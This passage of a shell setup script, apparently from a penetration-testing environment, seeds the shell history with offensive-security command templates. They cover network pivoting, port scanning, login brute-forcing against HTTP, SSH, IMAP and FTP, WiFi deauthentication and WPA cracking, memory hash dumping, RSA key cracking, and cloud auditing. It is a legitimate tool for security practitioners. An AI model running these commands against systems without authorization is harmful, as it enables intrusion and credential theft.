ip route add 192.168.0.0/24 dev ligolo
rustscan --addresses "$TARGET" --scripts custom --ulimit 5000
rustscan --addresses "$TARGET" --greppable
rustscan --addresses "$TARGET" --ports 80,443,8080
rustscan --addresses "$TARGET" --top
legba http.basic --username admin --password `fzf-wordlists` --target http://"$TARGET":"$PORT"
legba http --username "$USER" --password `fzf-wordlists` --target http://"$TARGET" --http-method POST --http-success-codes 302 --http-payload 'log={USERNAME}&pwd={PASSWORD}'
legba ssh --username "$USER" --password `fzf-wordlists` --target "$TARGET":22
legba imap --username "$USER" --password `fzf-wordlists` --target "$TARGET":993
legba ftp --username "$USER" --password `fzf-wordlists` --target "$TARGET":21
ssh-audit $TARGET
ssh-audit -T servers.txt
ssh-audit -L
airmon-ng start wlan1
airodump-ng wlan1
airodump-ng -c 1 wlan1
aireplay-ng --deauth 10 -a TR:GT:AP:BS:SS:ID wlan1
reaver -i eth0 -b $MAC
bully wlan1mon -b $MAC -c 9 -S -F -B -v 3
cowpatty -f wordlist.txt -r crackme.cap -s Mandela2
pyrit -r capture.pcap -b $BSSID -i wordlist.txt attack_passthrough
pyrit -i wordlist.txt import_passwords
pyrit -e $ESSID create_essid
pyrit batch
pyrit -r capture.pcap attack_db
Wifite.py --kill
Wifite.py --dict passwords.txt
bettercap -iface eth0
hcxpcapngtool -o dump.hashcat dump.pcapng
hcxhashtool -i dump.hashcat --info stdout
hcxpcapngtool --all -o dump.hashcat dump.pcapng
hcxdumptool -I
hcxdumptool -i wlan1 -o dump.pcapng --active_beacon --enable_status=1
foremost -i image.png
testdisk image.dd
fdisk image.dd
fdisk -l
binwalk -e image.png
volatility2 -f memory.dmp imageinfo
volatility2 -f memory.dmp --profile=Win7SP1x86 pstree
volatility2 -f memory.dmp --profile=Win7SP1x86 netscan
volatility2 -f memory.dmp --profile=Win7SP1x86 cmdline
volatility2 -f memory.dmp --profile=Win7SP1x86 hashdump
volatility3 -f memory.dmp windows.info
volatility3 -f memory.dmp windows.pslist
volatility3 -f memory.dmp windows.netscan
volatility3 -f memory.dmp windows.cmdline
volatility3 -f memory.dmp windows.dlllist --pid $PID
volatility3 -f memory.dmp windows.malfind
trid
peepdf.py -i file.pdf
jadx-gui ./source/
jadx -d ./output/ exegol.apk
chainsaw hunt -r rules/ evtx_attack_samples -s sigma/rules --mapping mappings/sigma-event-logs-all.yml --level critical
olevba document.docx
kubectl
k9s
k9s --read-only
aws configure --profile exegol
aws s3 ls s3://mybucket
aws s3 iam list-users
aws s3 iam get-user --user-name $USER
scout aws --profile default -f
scout azure --cli
cloudsplaining download
cloudsplaining download --profile someprofile
cloudsplaining scan --input-file default.json
cloudsplaining scan --input-file default.json --exclusions-file exclusions.yml
cloudsplaining scan-policy-file --input-file examples/policies/wildcards.json
cloudsplaining scan-policy-file --input-file examples/policies/wildcards.json  --exclusions-file examples/example-exclusions.yml
cloudsplaining create-multi-account-config-file -o accounts.yml
cloudsplaining scan-multi-account -c accounts.yml -r TargetRole --output-directory ./
prowler aws --checks s3_bucket_public_access
prowler aws --services s3 ec2
prowler aws --profile custom-profile -f us-east-1 eu-south-2
prowler azure --sp-env-auth
prowler azure --az-cli-auth
prowler azure --browser-auth
prowler azure --managed-identity-auth
prowler gcp --credentials-file path
cloudmapper.py configure add-account --config-file config.json --name parent --id XXX --default true
cloudmapper.py configure discover-organization-accounts
cloudmapper.py collect --account parent --profile parent
cloudmapper.py report --account parent
cloudmapper.py webserver
az storage -h
az vm create -h
az vm show -g WebPropertiesRG -n Bizlogic
stegosuite
steghide extract -sf image.png
exif image.jpg
exiv2 image.png
hexedit image.png
zsteg -a image.png
stegolsb -v extract image.png --column-step 2 --rows 1 --columns 128
nasm -felf64 -o <object> <filename>
strace -p $PID
gdb binary.bin
checksec.py binary.bin
radare2 binary.bin
ghidra
ida
jd-gui
pwninit
pycdc program.pyc
pycdas program.pyc
RsaCtfTool --publickey $PUBLIC_KEY --uncipherfile ./ciphered\_file
RsaCtfTool --publickey $PUBLIC_KEY --private
RsaCtfTool --createpub -n 7828374823761928712873129873981723...12837182 -e 65537
RsaCtfTool --dumpkey --key $PUBLIC_KEY
RsaCtfTool --key examples/conspicuous.priv --isconspicuous
RsaCtfTool --publickey $PUBLIC_KEY --ecmdigits 25 --verbose --private
RsaCtfTool --attack partial_q --key $PEM_KEY
RsaCtfTool --attack partial_d --key $PEM_KEY
RsaCtfTool --convert_idrsa_pub --publickey $HOME/.ssh/id_rsa.pub
RsaCtfTool --isroca --publickey $PUBLIC_KEY
tls-map search gnutls RSA_ARCFOUR_128_SHA1 --output iana
tls-map search openssl AES128-SHA --output iana
tls-map search iana TLS_DH_RSA_WITH_AES_256_CBC_SHA --output codepoint
tls-map search codepoint 1303
tls-map search nss TLS_AES_256_GCM_SHA384
tls-map search --extended codepoint 0037
tls-map search --extended codepoint 0013 --acronym
tls-map export /tmp/map.min.json json_compact
tls-map extract newwebsite.json ssllabs-scan
tls-map extract test/file_sample/testssl.json testssl --hide-weak
tls-map extract test/file_sample/sslyze.json sslyze --only-weak
rsacracker --key public.pem -c 0xdeadbeef
rsacracker -c 0xdeadbeef -n 323 -e 65537
rsacracker -c 0xdeadbeef -n 323 -e 65537 --phi 123 --dp 123 --dq 123 --qinv 123 --pinv 123
rsacracker --key public.pem -f secret.txt.enc
rsacracker --key public.pem --private
rsacracker --key private.pem --password R54Cr4ck3R --private
rsacracker -n 323 --factors
brakeman /path/to/rails/application
semgrep -e '$X == $X' --lang=py path/to/src
node --experimental-loader pp-finder ./index.js
gitleaks git -v ./
gitleaks dir -v ./
trufflehog git https://github.com/OWNER/REPO.git
trufflehog filesystem ./
# -=-=-=-=-=-=-=- YOUR COMMANDS BELOW -=-=-=-=-=-=-=- #
' > ~/.exegol_history



# === Add the commands to your history
# Detect which shell is running
if [ -n "$ZSH_VERSION" ]; then
    # Zsh-specific history loading
    if [ -f ~/.exegol_history ]; then
        # Load without duplicates
        while IFS= read -r cmd; do
            if ! grep -Fxq "$cmd" "$HISTFILE"; then
                echo "$cmd" >> "$HISTFILE"
            fi
        done < ~/.exegol_history
        # Remove duplicates and reload
        sort -u "$HISTFILE" -o "$HISTFILE"
        fc -R "$HISTFILE" 2>/dev/null
    fi
elif [ -n "$BASH_VERSION" ]; then
    # Bash-specific history loading
    if [ -f ~/.exegol_history ]; then
        while IFS= read -r cmd; do
            if ! grep -Fxq "$cmd" "$HISTFILE"; then
                echo "$cmd" >> "$HISTFILE"
            fi
        done < ~/.exegol_history
        # Reload bash history
        history -n
    fi
fi

## set-up fzf
```
